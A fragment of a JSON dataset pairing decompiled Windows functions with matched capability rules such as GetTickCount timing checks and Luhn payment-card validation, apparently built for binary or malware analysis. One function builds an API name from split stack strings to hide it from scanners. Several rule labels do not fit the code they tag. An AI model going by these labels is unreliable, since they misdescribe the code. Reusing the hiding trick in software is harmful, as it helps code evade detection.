        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10ch\n\nvoid __cdecl fcn.0041348d(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x435040 ^ &stack0xfffffffc;\n    if (((arg_8h < 6) && (arg_ch != 0)) &&\n       (iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, arg_ch, 0xffffffff, &var_10ch, 0x83),  iVar1 != 0)) {\n        fcn.00413b7f(arg_8h, &var_10ch);\n    }\n    fcn.004023ff(var_10ch);\n    return;\n}\n",
        "token_count": 193
    },
    "00401260": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401260(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(arg_8h, 0xffffffeb);\n    if (arg_ch != 0x14) {\n        if (arg_ch != 0x113) {\n            if (arg_ch == 0x205) {\n                (*_sym.imp.USER32.dll_GetCursorPos)(&var_8h);\n                (*_sym.imp.USER32.dll_TrackPopupMenu)(*(iVar1 + 0xc), 0, var_8h, var_4h, 100, *(iVar1 + 0x14), 0);\n                return 0;\n            }\n            uVar2 = (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n            return uVar2;\n        }\n        if (arg_10h != 0x4b0) {\n            return 0;\n        }\n    }\n    fcn.00401005();\n    return 0;\n}\n",
        "token_count": 282
    },
    "00410010": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nulong * fcn.00410010(ulong *param_1, ulong *param_2, uint32_t param_3)\n\n{\n    ulong uVar1;\n    uchar auVar2 [32];\n    uchar auVar3 [32];\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    int32_t iVar16;\n    ulong *puVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    int32_t iVar20;\n    ulong *puVar21;\n    uint *puVar22;\n    uint *puVar23;\n    uint uVar24;\n    uint uVar25;\n    uint uVar26;\n    \n    if ((param_2 < param_1) && (param_1 < param_3 + param_2)) {\n        puVar22 = (param_3 - 4) + param_2;\n        puVar23 = (param_3 - 4) + param_1;\n        if ((puVar23 & 3) == 0) {\n            uVar19 = param_3 >> 2;\n            if (uVar19 < 8) goto code_r0x004103c0;\n            for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                *puVar23 = *puVar22;\n                puVar22 = puVar22 + -1;\n                puVar23 = puVar23 + -1;\n            }\n    // switch table (4 cases) at 0x4104e4\n            switch(param_3 & 3) {\n            case 1:\n                goto code_r0x004104fc;\n            case 2:\n                goto code_r0x0041050c;\n            case 3:\n                goto code_r0x00410520;\n            }\n        }\n        else {\n    // switch table (4 cases) at 0x4104e4\n            switch(param_3) {\n            case 0:\n                break;\n            case 1:\ncode_r0x004104fc:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                return param_1;\n            case 2:\ncode_r0x0041050c:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                *(puVar23 + 2) = *(puVar22 + 2);\n                return param_1;\n            case 3:\ncode_r0x00410520:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                *(puVar23 + 2) = *(puVar22 + 2);\n                *(puVar23 + 1) = *(puVar22 + 1);\n                return param_1;\n            default:\n                param_3 = param_3 - (puVar23 & 3);\n                switch(puVar23 & 3) {\n                case 1:\n                    *(puVar23 + 3) = *(puVar22 + 3);\n                    puVar22 = puVar22 + -1;\n                    uVar19 = param_3 >> 2;\n                    puVar23 = puVar23 - 1;\n                    if (uVar19 < 8) {\ncode_r0x004103c0:\n    // WARNING: Could not recover jumptable at 0x004103c2. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x410494\n                        puVar17 = (**(uVar19 * -4 + 0x410494))();\n                        return puVar17;\n                    }\n                    for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                        *puVar23 = *puVar22;\n                        puVar22 = puVar22 + -1;\n                        puVar23 = puVar23 + -1;\n                    }\n                    switch(param_3 & 3) {\n                    case 1:\n                        goto code_r0x004104fc;\n                    case 2:\n                        goto code_r0x0041050c;\n                    case 3:\n                        goto code_r0x00410520;\n                    }\n                    break;\n                case 2:\n                    *(puVar23 + 3) = *(puVar22 + 3);\n                    uVar19 = param_3 >> 2;\n                    *(puVar23 + 2) = *(puVar22 + 2);\n                    puVar22 = puVar22 + -2;\n                    puVar23 = puVar23 - 2;\n                    if (uVar19 < 8) goto code_r0x004103c0;\n                    for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                        *puVar23 = *puVar22;\n                        puVar22 = puVar22 + -1;\n                        puVar23 = puVar23 + -1;\n                    }\n                    switch(param_3 & 3) {\n                    case 1:\n                        goto code_r0x004104fc;\n                    case 2:\n                        goto code_r0x0041050c;\n                    case 3:\n                        goto code_r0x00410520;\n                    }\n                    break;\n                case 3:\n                    *(puVar23 + 3) = *(puVar22 + 3);\n                    *(puVar23 + 2) = *(puVar22 + 2);\n                    uVar19 = param_3 >> 2;\n                    *(puVar23 + 1) = *(puVar22 + 1);\n                    puVar22 = puVar22 + -3;\n                    puVar23 = puVar23 - 3;\n                    if (uVar19 < 8) goto code_r0x004103c0;\n                    for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                        *puVar23 = *puVar22;\n                        puVar22 = puVar22 + -1;\n                        puVar23 = puVar23 + -1;\n                    }\n                    switch(param_3 & 3) {\n                    case 1:\n                        goto code_r0x004104fc;\n                    case 2:\n                        goto code_r0x0041050c;\n                    case 3:\n                        goto code_r0x00410520;\n                    }\n                }\n            }\n        }\n        return param_1;\n    }\n    puVar17 = param_1;\n    if ((*0x4377a4 >> 1 & 1) != 0) {\n        for (; param_3 != 0; param_3 = param_3 - 1) {\n            *puVar17 = *param_2;\n            param_2 = param_2 + 1;\n            puVar17 = puVar17 + 1;\n        }\n        return param_1;\n    }\n    if (param_3 < 0x80) {\ncode_r0x0041021b:\n        if ((param_1 & 3) != 0) {\ncode_r0x00410238:\n            switch(param_3) {\n            case 0:\n                return param_1;\n            case 1:\n                break;\n            case 2:\n                goto code_r0x0041036c;\n            case 3:\n                goto code_r0x00410380;\n            default:\n                uVar19 = (param_3 - 4) + (param_1 & 3);\n                switch(param_1 & 3) {\n                case 0:\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                case 1:\n                    *param_1 = *param_2;\n                    *(param_1 + 1) = *(param_2 + 1);\n                    uVar18 = uVar19 >> 2;\n                    *(param_1 + 2) = *(param_2 + 2);\n                    param_2 = param_2 + 3;\n                    puVar17 = param_1 + 3;\n                    if (7 < uVar18) {\n                        for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n                            *puVar17 = *param_2;\n                            param_2 = param_2 + 4;\n                            puVar17 = puVar17 + 4;\n                        }\n                        switch(uVar19 & 3) {\n                        case 0:\n                            return param_1;\n                        case 2:\n                            goto code_r0x0041036c;\n                        case 3:\n                            goto code_r0x00410380;\n                        }\n                        break;\n                    }\n                    goto code_r0x00410258;\n                case 2:\n                    *param_1 = *param_2;\n                    uVar18 = uVar19 >> 2;\n                    *(param_1 + 1) = *(param_2 + 1);\n                    param_2 = param_2 + 2;\n                    puVar17 = param_1 + 2;\n                    if (uVar18 < 8) goto code_r0x00410258;\n                    for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n                        *puVar17 = *param_2;\n                        param_2 = param_2 + 4;\n                        puVar17 = puVar17 + 4;\n                    }\n                    switch(uVar19 & 3) {\n                    case 0:\n                        return param_1;\n                    case 2:\n                        goto code_r0x0041036c;\n                    case 3:\n                        goto code_r0x00410380;\n                    }\n                    break;\n                case 3:\n                    *param_1 = *param_2;\n                    uVar18 = uVar19 >> 2;\n                    param_2 = param_2 + 1;\n                    puVar17 = param_1 + 1;\n                    if (uVar18 < 8) goto code_r0x00410258;\n                    for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n                        *puVar17 = *param_2;\n                        param_2 = param_2 + 4;\n                        puVar17 = puVar17 + 4;\n                    }\n                    switch(uVar19 & 3) {\n                    case 0:\n                        return param_1;\n                    case 2:\n                        goto code_r0x0041036c;\n                    case 3:\n                        goto code_r0x00410380;\n                    }\n                }\n            }\n            goto code_r0x00410360;\n        }\n    }\n    else {\n        if ((((param_1 ^ param_2) & 0xf) == 0) && ((*0x435dcc >> 1 & 1) != 0)) {\n            if ((param_2 & 0xf) != 0) {\n                uVar18 = 0x10 - (param_2 & 0xf);\n                param_3 = param_3 - uVar18;\n                for (uVar19 = uVar18 & 3; uVar19 != 0; uVar19 = uVar19 - 1) {\n                    *puVar17 = *param_2;\n                    param_2 = param_2 + 1;\n                    puVar17 = puVar17 + 1;\n                }\n                for (uVar18 = uVar18 >> 2; uVar18 != 0; uVar18 = uVar18 - 1) {\n                    *puVar17 = *param_2;\n                    param_2 = param_2 + 4;\n                    puVar17 = puVar17 + 4;\n                }\n            }\n            for (uVar19 = param_3 >> 7; uVar19 != 0; uVar19 = uVar19 - 1) {\n                uVar24 = *(param_2 + 4);\n                uVar25 = *(param_2 + 1);\n                uVar26 = *(param_2 + 0xc);\n                uVar4 = *(param_2 + 2);\n                uVar5 = *(param_2 + 0x14);\n                uVar6 = *(param_2 + 3);\n                uVar7 = *(param_2 + 0x1c);\n                uVar8 = *(param_2 + 4);\n                uVar9 = *(param_2 + 0x24);\n                uVar10 = *(param_2 + 5);\n                uVar11 = *(param_2 + 0x2c);\n                uVar12 = *(param_2 + 6);\n                uVar13 = *(param_2 + 0x34);\n                uVar14 = *(param_2 + 7);\n                uVar15 = *(param_2 + 0x3c);\n                *puVar17 = *param_2;\n                *(puVar17 + 4) = uVar24;\n                *(puVar17 + 1) = uVar25;\n                *(puVar17 + 0xc) = uVar26;\n                *(puVar17 + 2) = uVar4;\n                *(puVar17 + 0x14) = uVar5;\n                *(puVar17 + 3) = uVar6;\n                *(puVar17 + 0x1c) = uVar7;\n                *(puVar17 + 4) = uVar8;\n                *(puVar17 + 0x24) = uVar9;\n                *(puVar17 + 5) = uVar10;\n                *(puVar17 + 0x2c) = uVar11;\n                *(puVar17 + 6) = uVar12;\n                *(puVar17 + 0x34) = uVar13;\n                *(puVar17 + 7) = uVar14;\n                *(puVar17 + 0x3c) = uVar15;\n                uVar24 = *(param_2 + 0x44);\n                uVar25 = *(param_2 + 9);\n                uVar26 = *(param_2 + 0x4c);\n                uVar4 = *(param_2 + 10);\n                uVar5 = *(param_2 + 0x54);\n                uVar6 = *(param_2 + 0xb);\n                uVar7 = *(param_2 + 0x5c);\n                uVar8 = *(param_2 + 0xc);\n                uVar9 = *(param_2 + 100);\n                uVar10 = *(param_2 + 0xd);\n                uVar11 = *(param_2 + 0x6c);\n                uVar12 = *(param_2 + 0xe);\n                uVar13 = *(param_2 + 0x74);\n                uVar14 = *(param_2 + 0xf);\n                uVar15 = *(param_2 + 0x7c);\n                *(puVar17 + 8) = *(param_2 + 8);\n                *(puVar17 + 0x44) = uVar24;\n                *(puVar17 + 9) = uVar25;\n                *(puVar17 + 0x4c) = uVar26;\n                *(puVar17 + 10) = uVar4;\n                *(puVar17 + 0x54) = uVar5;\n                *(puVar17 + 0xb) = uVar6;\n                *(puVar17 + 0x5c) = uVar7;\n                *(puVar17 + 0xc) = uVar8;\n                *(puVar17 + 100) = uVar9;\n                *(puVar17 + 0xd) = uVar10;\n                *(puVar17 + 0x6c) = uVar11;\n                *(puVar17 + 0xe) = uVar12;\n                *(puVar17 + 0x74) = uVar13;\n                *(puVar17 + 0xf) = uVar14;\n                *(puVar17 + 0x7c) = uVar15;\n                param_2 = param_2 + 0x10;\n                puVar17 = puVar17 + 0x10;\n            }\n            if ((param_3 & 0x7f) != 0) {\n                for (uVar19 = (param_3 & 0x7f) >> 4; uVar19 != 0; uVar19 = uVar19 - 1) {\n                    uVar24 = *(param_2 + 4);\n                    uVar25 = *(param_2 + 1);\n                    uVar26 = *(param_2 + 0xc);\n                    *puVar17 = *param_2;\n                    *(puVar17 + 4) = uVar24;\n                    *(puVar17 + 1) = uVar25;\n                    *(puVar17 + 0xc) = uVar26;\n                    param_2 = param_2 + 2;\n                    puVar17 = puVar17 + 2;\n                }\n                if ((param_3 & 0xf) != 0) {\n                    for (uVar19 = (param_3 & 0xf) >> 2; uVar19 != 0; uVar19 = uVar19 - 1) {\n                        *puVar17 = *param_2;\n                        param_2 = param_2 + 4;\n                        puVar17 = puVar17 + 4;\n                    }\n                    for (param_3 = param_3 & 3; param_3 != 0; param_3 = param_3 - 1) {\n                        *puVar17 = *param_2;\n                        param_2 = param_2 + 1;\n                        puVar17 = puVar17 + 1;\n                    }\n                }\n            }\n            return param_1;\n        }\n        if ((*0x4377a4 & 1) == 0) goto code_r0x0041021b;\n        if ((param_1 & 3) != 0) goto code_r0x00410238;\n        if ((param_2 & 3) == 0) {\n            if ((param_1 >> 2 & 1) != 0) {\n                uVar24 = *param_2;\n                param_3 = param_3 - 4;\n                param_2 = param_2 + 4;\n                *param_1 = uVar24;\n                param_1 = param_1 + 4;\n            }\n            if ((param_1 >> 3 & 1) != 0) {\n                uVar1 = *param_2;\n                param_3 = param_3 - 8;\n                param_2 = param_2 + 1;\n                *param_1 = uVar1;\n                param_1 = param_1 + 1;\n            }\n            if ((param_2 & 7) == 0) {\n                puVar17 = param_2 + -1;\n                uVar24 = *param_2;\n                uVar25 = *(param_2 + 4);\n                do {\n                    puVar21 = puVar17;\n                    uVar5 = *(puVar21 + 4);\n                    uVar6 = *(puVar21 + 0x24);\n                    param_3 = param_3 - 0x30;\n                    auVar2 = *(puVar21 + 2);\n                    uVar26 = *(puVar21 + 7);\n                    uVar4 = *(puVar21 + 0x3c);\n                    auVar3 = *(puVar21 + 4);\n                    *(param_1 + 1) = uVar24;\n                    *(param_1 + 0xc) = uVar25;\n                    *(param_1 + 2) = uVar5;\n                    *(param_1 + 0x14) = uVar6;\n                    *(param_1 + 2) = SUB3216(auVar2 >> 0x40, 0);\n                    *(param_1 + 4) = SUB3216(auVar3 >> 0x40, 0);\n                    param_1 = param_1 + 6;\n                    puVar17 = puVar21 + 6;\n                    uVar24 = uVar26;\n                    uVar25 = uVar4;\n                } while (0x2f < param_3);\n                puVar21 = puVar21 + 7;\n            }\n            else if ((param_2 >> 3 & 1) == 0) {\n                iVar16 = param_2 + -4;\n                uVar24 = *param_2;\n                uVar25 = *(param_2 + 4);\n                uVar26 = *(param_2 + 1);\n                do {\n                    iVar20 = iVar16;\n                    uVar7 = *(iVar20 + 0x20);\n                    param_3 = param_3 - 0x30;\n                    auVar2 = *(iVar20 + 0x10);\n                    uVar4 = *(iVar20 + 0x34);\n                    uVar5 = *(iVar20 + 0x38);\n                    uVar6 = *(iVar20 + 0x3c);\n                    auVar3 = *(iVar20 + 0x20);\n                    *(param_1 + 4) = uVar24;\n                    *(param_1 + 1) = uVar25;\n                    *(param_1 + 0xc) = uVar26;\n                    *(param_1 + 2) = uVar7;\n                    *(param_1 + 2) = SUB3216(auVar2 >> 0x20, 0);\n                    *(param_1 + 4) = SUB3216(auVar3 >> 0x20, 0);\n                    param_1 = param_1 + 6;\n                    iVar16 = iVar20 + 0x30;\n                    uVar24 = uVar4;\n                    uVar25 = uVar5;\n                    uVar26 = uVar6;\n                } while (0x2f < param_3);\n                puVar21 = iVar20 + 0x34;\n            }\n            else {\n                iVar16 = param_2 + -0xc;\n                uVar24 = *param_2;\n                do {\n                    iVar20 = iVar16;\n                    uVar26 = *(iVar20 + 0x20);\n                    uVar4 = *(iVar20 + 0x24);\n                    uVar5 = *(iVar20 + 0x28);\n                    param_3 = param_3 - 0x30;\n                    auVar2 = *(iVar20 + 0x10);\n                    uVar25 = *(iVar20 + 0x3c);\n                    auVar3 = *(iVar20 + 0x20);\n                    *(param_1 + 0xc) = uVar24;\n                    *(param_1 + 2) = uVar26;\n                    *(param_1 + 0x14) = uVar4;\n                    *(param_1 + 3) = uVar5;\n                    *(param_1 + 2) = SUB3216(auVar2 >> 0x60, 0);\n                    *(param_1 + 4) = SUB3216(auVar3 >> 0x60, 0);\n                    param_1 = param_1 + 6;\n                    iVar16 = iVar20 + 0x30;\n                    uVar24 = uVar25;\n                } while (0x2f < param_3);\n                puVar21 = iVar20 + 0x3c;\n            }\n            for (; 0xf < param_3; param_3 = param_3 - 0x10) {\n                uVar24 = *puVar21;\n                uVar25 = *(puVar21 + 4);\n                uVar26 = *(puVar21 + 1);\n                uVar4 = *(puVar21 + 0xc);\n                puVar21 = puVar21 + 2;\n                *param_1 = uVar24;\n                *(param_1 + 4) = uVar25;\n                *(param_1 + 1) = uVar26;\n                *(param_1 + 0xc) = uVar4;\n                param_1 = param_1 + 2;\n            }\n            if ((param_3 >> 2 & 1) != 0) {\n                uVar24 = *puVar21;\n                param_3 = param_3 - 4;\n                puVar21 = puVar21 + 4;\n                *param_1 = uVar24;\n                param_1 = param_1 + 4;\n            }\n            if ((param_3 >> 3 & 1) != 0) {\n                param_3 = param_3 - 8;\n                *param_1 = *puVar21;\n            }\n    // WARNING: Could not recover jumptable at 0x00410219. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (4 cases) at 0x410348\n            puVar17 = (**(param_3 * 4 + 0x410348))();\n            return puVar17;\n        }\n    }\n    uVar18 = param_3 >> 2;\n    if (uVar18 < 8) {\ncode_r0x00410258:\n    // WARNING: Could not recover jumptable at 0x00410258. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x4102dc\n        puVar17 = (**(uVar18 * 4 + 0x4102dc))();\n        return puVar17;\n    }\n    for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n        *puVar17 = *param_2;\n        param_2 = param_2 + 4;\n        puVar17 = puVar17 + 4;\n    }\n    // switch table (4 cases) at 0x410348\n    switch(param_3 & 3) {\n    case 0:\n        return param_1;\n    case 2:\ncode_r0x0041036c:\n        *puVar17 = *param_2;\n        *(puVar17 + 1) = *(param_2 + 1);\n        return param_1;\n    case 3:\ncode_r0x00410380:\n        *puVar17 = *param_2;\n        *(puVar17 + 1) = *(param_2 + 1);\n        *(puVar17 + 2) = *(param_2 + 2);\n        return param_1;\n    }\ncode_r0x00410360:\n    *puVar17 = *param_2;\n    return param_1;\n}\n",
        "token_count": 5809
    },
    "00401780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/01bb0ec37f0e4f748bf40bf8ad1af4de",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with lookup table/fb60ffb548f34d1da43070d509ac9033"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401780(int32_t arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    *arg_10h = arg_8h % 10;\n    *arg_ch = arg_8h / 10;\n    return;\n}\n",
        "token_count": 67
    },
    "00401014": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401014(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *arg_8h_00;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x435040 ^ &stack0xfffffffc;\n    var_10h = arg_ch;\n    var_ch = arg_8h;\n    var_14h = 0;\n    var_18h = 0;\n    var_8h = arg_10h;\n    uVar1 = fcn.0040100a(L\"ntdll.dll\");\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"LdrFindResource_U\");\n    pcVar3 = (*pcVar3)(uVar1, \"LdrAccessResource\");\n    arg_8h_00 = &var_1ch;\n    iVar4 = (*pcVar2)(0x400000, &var_10h, 3);\n    if (-1 < iVar4) {\n        iVar4 = (*pcVar3)(0x400000, var_1ch, &var_14h, &var_18h);\n        if ((-1 < iVar4) && (arg_14h != NULL)) {\n            *arg_14h = var_18h;\n        }\n    }\n    fcn.004023ff(arg_8h_00);\n    return;\n}\n",
        "token_count": 403
    },
    "0040101e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040101e(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x42a18b;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x435040 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *0x436840 = arg_8h;\n    arg_8h_00 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                          (0, 0x4368b0, 0x436848, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0, uVar1);\n    if (arg_8h_00 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 0;\n    }\n    iVar2 = fcn.00402524(0x20);\n    var_4h = 0;\n    if (iVar2 == 0) {\n        *0x436844 = 0;\n    }\n    else {\n        *0x436844 = fcn.0040106e(arg_8h_00, *0x436840, 0x4368b0);\n    }\n    var_4h = 0xffffffff;\n    (*_sym.imp.USER32.dll_UpdateWindow)(arg_8h_00);\n    *0x4368ac = 1;\n    fcn.0040104b(1);\n    fcn.0040102d();\n    *in_FS_OFFSET = var_ch;\n    return 1;\n}\n",
        "token_count": 417
    },
    "00401078": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00401078(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint var_58h;\n    char32_t var_54h;\n    char32_t cStack84;\n    char32_t cStack80;\n    char32_t cStack76;\n    char32_t var_44h;\n    char32_t cStack68;\n    char32_t cStack64;\n    char32_t cStack60;\n    char32_t var_34h;\n    char32_t cStack52;\n    char32_t cStack48;\n    char32_t cStack44;\n    char32_t var_24h;\n    char32_t cStack36;\n    char32_t cStack32;\n    char32_t cStack28;\n    char32_t var_14h;\n    char32_t cStack20;\n    char32_t cStack16;\n    char32_t cStack12;\n    uint32_t var_4h;\n    \n    var_4h = *0x435040 ^ &stack0xfffffffc;\n    var_54h = str.Cryp[0];\n    cStack84 = str.Cryp[1];\n    cStack80 = str.Cryp[2];\n    cStack76 = str.Cryp[3];\n    var_44h = str.tAcq[0];\n    cStack68 = str.tAcq[1];\n    cStack64 = str.tAcq[2];\n    cStack60 = str.tAcq[3];\n    var_34h = str.uire[0];\n    cStack52 = str.uire[1];\n    cStack48 = str.uire[2];\n    cStack44 = str.uire[3];\n    var_24h = str.Cont[0];\n    cStack36 = str.Cont[1];\n    cStack32 = str.Cont[2];\n    cStack28 = str.Cont[3];\n    var_14h = str.extA[0];\n    cStack20 = str.extA[1];\n    cStack16 = str.extA[2];\n    cStack12 = str.extA[3];\n    iVar1 = fcn.004025d7(0x14);\n    iVar4 = 0;\n    do {\n        *(iVar4 + iVar1) = *(&var_54h + iVar4);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x14);\n    *(iVar1 + 0x14) = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x42cce0, iVar1);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_58h = 0;\n    uVar2 = 0;\n    iVar1 = (*pcVar3)(&var_58h, 0, 0, 1, 0);\n    if (iVar1 == 0) {\n        fcn.004023ff(uVar2);\n        return;\n    }\n    uVar2 = 0;\n    (*pcVar3)(&var_58h, 0, 0, 1, 8);\n    fcn.004023ff(uVar2);\n    return;\n}\n",
        "token_count": 711
    },
    "00401ab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ab0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.004025d7(arg_ch);\n    iVar2 = 0;\n    if (arg_ch < 1) {\n        *(iVar1 + arg_ch) = 0;\n        return;\n    }\n    do {\n        *(iVar2 + iVar1) = *(arg_8h + iVar2 * 4);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < arg_ch);\n    *(iVar1 + arg_ch) = 0;\n    return;\n}\n",
        "token_count": 149
    },
    "0040609d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040609d(void)\n\n{\n    code **ppcVar1;\n    \n    for (ppcVar1 = 0x433d98; ppcVar1 < 0x433e98; ppcVar1 = ppcVar1 + 1) {\n        if (*ppcVar1 != NULL) {\n            (**ppcVar1)();\n        }\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0040ab89": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ab89(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040ae67(arg_8h, arg_ch, arg_10h, 0x42dee4);\n    return arg_8h;\n}\n",
        "token_count": 64
    },
    "0040aba7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040aba7(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040ae67(arg_8h, arg_ch, arg_10h, 0x42dc84);\n    return arg_8h;\n}\n",
        "token_count": 64
    },
    "0040f784": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f784(uint arg_8h)\n\n{\n    fcn.0041258a(arg_8h, 0, 10);\n    return;\n}\n",
        "token_count": 41
    },
    "0040f798": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f798(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004125b4(arg_8h, 0, 10, arg_ch);\n    return;\n}\n",
        "token_count": 48
    },
    "0040f7af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f7af(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004128b3(arg_8h, 0, 10, arg_ch);\n    return;\n}\n",
        "token_count": 49
    },
    "0040f7cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f7cf(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004125b4(arg_8h, 0, 10, arg_ch);\n    return;\n}\n",
        "token_count": 49
    },
    "0040f803": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f803(uint arg_8h)\n\n{\n    fcn.0041258a(arg_8h, 0, 10);\n    return;\n}\n",
        "token_count": 41
    },
    "004125b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004125b4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.004122fa(arg_14h, arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 66
    },
    "00412614": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412614(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.004122fa(arg_14h, arg_8h, arg_ch, arg_10h, 1);\n    return;\n}\n",
        "token_count": 65
    },
    "00412669": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412669(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004146ba(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 43
    },
